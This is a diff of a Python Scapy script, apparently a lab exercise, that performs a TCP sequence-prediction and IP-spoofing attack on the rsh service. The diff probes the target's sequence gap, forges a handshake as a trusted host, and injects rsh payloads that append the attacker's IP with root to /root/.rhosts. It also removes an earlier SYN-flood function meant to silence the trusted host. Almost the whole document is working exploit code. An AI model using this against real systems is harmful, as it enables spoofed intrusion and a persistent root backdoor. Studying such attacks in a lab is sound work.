@@ -4,9 +4,7 @@ import sys
 import re
 from statistics import mode
 
-lseq = 100
-sport = 900
-dport = 514
+nexseq = 100
 
 #find gap in subsequent SEQ values
 def detective(src):
@@ -18,48 +16,44 @@ def detective(src):
 		tcp = TCP()
 		tcp.dport = 513
 		tcp.flags = "S"
-		resp = sr1(ip/tcp, verbose = 0)
+		resp = sr1(ip/tcp, verbose=0)
 		if(i!=0):
 			seqs.append(resp[TCP].seq - previous)
 		previous = resp[TCP].seq
 	return mode(seqs)
 
-#flood port 513 to block logins
-def synFlood(src, target, payload):
-	for port in range(10):
-		ip = IP(src=src, dst=target)
-		tcp = TCP(sport=15151, dport=513)
-		pkt = ip / tcp / payload
-		send(pkt)
-
-#get next seq value
+#get next ack value
 def getNext(val, seq_gap):
 	ip = IP(dst=val)
 	tcp = TCP(dport=514, sport=514, flags="S")
-	resp = sr1(ip/tcp, verbose = 0)
+	resp = sr1(ip/tcp, verbose=0)
+	print("#Received SEQ %d" % resp[TCP].seq)
 	return resp[TCP].seq + 1 + seq_gap
 
 #spoof three-way handshake between src and dest with precalculated ack value
 def spoof(src, dest, ack):
-	global lseq, sport, dport
+	global nexseq
+	#create and send SYN
 	ip = IP(src=src, dst=dest)
-	tcp = TCP(sport=sport, dport=dport, seq=lseq, flags="S")
+	tcp = TCP(sport=711, dport=514, seq=nexseq, flags="S")
 	pkt = (ip/tcp)
 	send(pkt, verbose=0)
-	lseq += 1
-	time.sleep(3) #wait before sending next packet
-	tcp = TCP(sport=sport, dport=dport, ack=ack, flags="A")
-	send(pkt,verbose=0)
-	time.sleep(3)
+	nexseq += 1
+	time.sleep(2) #wait before sending next packet
+	#create and send ACK
+	tcp = TCP(sport=711, dport=514, ack=ack, seq=nexseq, flags="A")
+	pkt = (ip/tcp)
+	send(pkt, verbose=0)
+	time.sleep(2)
 
 def sendPL(src, dest, ack, payload):
-	global lseq, sport, dport
+	global nexseq
 	ip = IP(src=src, dst=dest)
-	tcp = TCP(sport=sport, dport=dport, seq=lseq, ack=ack, flags="PA")
+	tcp = TCP(sport=711, dport=514, seq=nexseq, ack=ack, flags="PA")
 	pkt = ip/tcp/payload
-	send(pkt,verbose=0)
-	lseq += len(payload)
-	time.sleep(3)
+	send(pkt, verbose=0)
+	nexseq += len(payload)
+	time.sleep(2)
 
 if __name__ == "__main__":
 	conf.iface = sys.argv[1]
@@ -69,14 +63,20 @@ if __name__ == "__main__":
 	my_ip = get_if_addr(sys.argv[1])
 
 	#TODO: figure out SYN sequence number pattern
+	print("#finding seq gap")
 	seq_gap = detective(target_ip)
-	print(seq_gap)
-	synFlood(trusted_host_ip, target_ip, "disable")
+	print("#",seq_gap)
+	print("#getting next ack")
 	predicted = getNext(target_ip, seq_gap)
 	
 	#TODO: TCP hijacking with predicted sequence number
 	#SPOOOOOOOOOOOOOF
+	print("#spoofing connection with target")
 	spoof(trusted_host_ip, target_ip, predicted)
 	#send payload for access
-	sendPL(trusted_host_ip, target_ip, predicted, "echo '10.4.22.77 root' >> /root/.rhosts")
+	print("#sending payloads")
+	sendPL(trusted_host_ip, target_ip, predicted, "\0")
+	sendPL(trusted_host_ip, target_ip, predicted, "root\0")
+	sendPL(trusted_host_ip, target_ip, predicted, "root\0")
+	sendPL(trusted_host_ip, target_ip, predicted, "echo '10.4.22.77 root' >> /root/.rhosts\0")
 
